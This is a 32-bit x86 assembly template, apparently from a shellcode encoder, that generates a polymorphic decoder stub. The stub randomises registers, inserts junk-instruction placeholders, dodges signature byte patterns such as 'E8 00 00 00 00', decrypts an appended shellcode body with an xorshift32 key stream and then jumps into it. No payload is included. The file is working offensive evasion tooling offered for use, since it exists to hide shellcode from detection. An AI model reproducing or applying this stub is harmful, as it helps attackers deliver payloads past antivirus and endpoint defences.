.code32

// the ret and next labels are used to prevent
// "0x00, 0x00, 0x00" and "0xFF, 0xFF, 0xFF"
// about call or jmp instructions

// eax store the random seed
// ebx store the crypto key
// ecx store the loop times
// edx store the xor shift median
// esi store the body address
// edi store the current value

header:
  // save context
  pushad                                       {{igi}}
  pushfd                                       {{igi}}

  mov {{.Reg.eax}}, {{hex .Seed}}              {{igi}}
  mov {{.Reg.ebx}}, {{hex .Key}}               {{igi}}

  // prevent continuous 0x00
  mov {{.Reg.ecx}}, {{hex .NumLoopStub}}       {{igi}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskA}}      {{igi}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskB}}      {{igi}}

  // for prevent "E8 00 00 00 00"
  call calc_body_addr
 flag_CEA:                                              {{igi}}
  add {{.Reg.esi}}, body - flag_CEA + {{hex .OffsetT}}  {{igi}}
  add {{.Reg.esi}}, {{hex .OffsetA}}                    {{igi}}
  sub {{.Reg.esi}}, {{hex .OffsetS}}                    {{igi}}

  // decode shellcode body
 loop_xor:
  mov {{.Reg.edi}}, [{{.Reg.esi}}]             {{igs}}
  ror {{.Reg.edi}}, 5                          {{igs}}
  xor {{.Reg.edi}}, {{.Reg.eax}}               {{igs}}
  rol {{.Reg.edi}}, 17                         {{igs}}
  xor {{.Reg.edi}}, {{.Reg.ebx}}               {{igs}}
  mov [{{.Reg.esi}}], {{.Reg.edi}}             {{igs}}

  // call xor shift 32
  jmp xor_shift_32                             {{igs}}
 ret_1:

  // update address and counter
  add {{.Reg.esi}}, 4                          {{igs}}
  dec {{.Reg.ecx}}                             {{igs}}
  jnz loop_xor                                 {{igs}}

  // skip function xor shift 32
  jmp next_1                                   {{igs}}

xor_shift_32:
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igs}}
  shl {{.Reg.edx}}, 13                         {{igs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igs}}
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igs}}
  shr {{.Reg.edx}}, 17                         {{igs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igs}}
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igs}}
  shl {{.Reg.edx}}, 5                          {{igs}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igs}}
  jmp ret_1                                    {{igs}}
 next_1:

  // restore context
  popfd                                        {{igi}}
  popad                                        {{igi}}

{{if .Padding}}
  {{igi}}  {{igi}}  {{igi}}  {{igi}}
  {{igi}}  {{igi}}  {{igi}}  {{igi}}
  {{igi}}  {{igi}}  {{igi}}  {{igi}}
  {{igi}}  {{igi}}  {{igi}}  {{igi}}
  {{igi}}  {{igi}}  {{igi}}  {{igi}}
  {{igi}}  {{igi}}  {{igi}}  {{igi}}
  {{igi}}  {{igi}}  {{igi}}  {{igi}}
  {{igi}}  {{igi}}  {{igi}}  {{igi}}
{{end}}

  // go to the shellcode body
  jmp body                                     {{igi}}

{{if .Padding}}
  {{db .PadData}}
{{end}}

calc_body_addr:
  pop  {{.Reg.esi}}                            {{igi}}
  push {{.Reg.esi}}                            {{igi}}
  ret                                          {{igi}}

body:
